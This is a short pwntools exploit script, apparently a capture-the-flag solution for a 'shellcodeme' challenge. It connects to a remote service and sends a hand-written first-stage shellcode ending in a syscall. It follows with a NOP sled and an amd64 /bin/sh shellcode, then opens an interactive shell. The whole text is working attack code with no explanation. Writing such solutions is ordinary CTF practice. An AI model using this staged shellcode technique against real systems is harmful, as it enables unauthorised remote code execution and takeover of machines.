from pwn import *
r = remote('shellcodeme.420blaze.in', 420)
r.sendline("\x5f\x5f\x52\x5E\x58\x58\x58"+"\x5a"*33+"\x0F\x05")

time.sleep(2)

context.arch="amd64"
r.send("\x90"*79+asm(shellcraft.amd64.sh()))

r.interactive()